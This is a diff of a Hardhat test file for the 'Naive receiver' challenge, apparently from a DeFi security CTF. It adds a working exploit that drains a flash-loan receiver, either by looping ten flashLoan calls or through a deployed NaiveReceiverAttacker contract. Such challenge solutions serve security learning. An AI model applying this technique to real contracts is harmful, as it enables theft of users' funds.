@@ -25,12 +25,24 @@ describe('[Challenge] Naive receiver', function () {
 
         this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
         await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
-        
+    
         expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */  
+        const ETHER_1 = ethers.utils.parseEther('1');
+        
+        /** Solution wo/ additional contract.
+        for(let i = 0; i < 10; i++)
+            await this.pool.connect(attacker).flashLoan(this.receiver.address, ETHER_1);
+        */
+
+        /** Solution w/ contract for 1 step hack */
+        const AttackFactory = await ethers.getContractFactory('NaiveReceiverAttacker', deployer);
+
+        this.Attacker = await AttackFactory.deploy();
+        await this.Attacker.connect(attacker).attack(this.pool.address, this.receiver.address);
     });
 
     after(async function () {
